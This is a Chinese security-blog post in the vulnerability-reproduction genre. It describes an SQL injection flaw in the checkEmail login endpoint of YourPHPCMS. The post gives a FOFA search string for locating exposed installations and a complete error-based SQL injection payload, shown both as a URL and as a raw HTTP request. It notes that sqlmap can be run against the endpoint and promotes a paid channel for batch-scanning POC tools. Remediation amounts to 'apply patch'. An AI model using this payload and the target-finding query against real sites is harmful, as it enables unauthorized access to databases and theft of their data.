#  YourPHPCMS checkEmail接口存在SQL注入漏洞 附POC   
2024-12-23更新  南风漏洞复现文库   2024-12-23 15:23  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. YourPHPCMS 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
YourPHPCMS  
## 2.漏洞描述  
  
‌YourPHPCMS‌是一款完全开源的PHP和MySQL系统，主要用于企业网站管理。它基于**ThinkPHP框架开发，支持多种功能模块，如内容管管理、用户管理、广告管理等‌，YourPHPCMS checkEmail接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
YourPHPCMS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6C97ibcM9AU79ejiacRkjkHicmROuwY5PJywqOILRiaWjTIcv6dP2NDk1q1A/640?wx_fmt=png&from=appmsg "null")  
  
YourPHPCMS checkEmail接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
header="YP_onlineid"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x71706b6b71%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt  
  
漏洞数据包：  
```
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x71706b6b71%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt HTTP/1.1
Host: xxx.xx.xxx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6Cia4B2F200mnZjPFGON6AjImibQxT5e0XlGTTicD4LMuPXUaG8lTje8Zag/640?wx_fmt=jpeg&from=appmsg "null")  
  
可以跑sqlmap  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6CsL6Jx5sPlSRgepibcHLo36XbPAuSy7Ch2D20YGfB9Yb6fZlY6NE6YEA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6CUZ5TZTocialYP97dGIeQfM9Mpq5hz7BM4uWDqKUjNSfEOCrkWFp9Z8g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6Cic8kgObBjmSorRbOib7pZeRCWYakicjJp0iawyO0U6W2hic2pmSeWYYuq0g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6CDHTa85p8Dg6a8ereROHBcKvfCPjC1KtfQQsOJDsVWYIY6bH4fDZYeg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6C1RicIkvLG5T2hRib754TS1ARAtDUiclibibuJDkvIDvX4Kkpw0ryyI0Bycw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Zj4mniaichXKgV21nBQOKd6CQEVHTB1AqTKoQKIRaQSeK7kTqvOiaAI37IbKQ8jEt4yXt1ic3gcGU4Wg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[Palo Alto Networks PAN-OS存在远程命令执行漏洞CVE-2024-9474 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487960&idx=1&sn=201e394851f63027036f862d8a36895d&scene=21#wechat_redirect)  
  
  
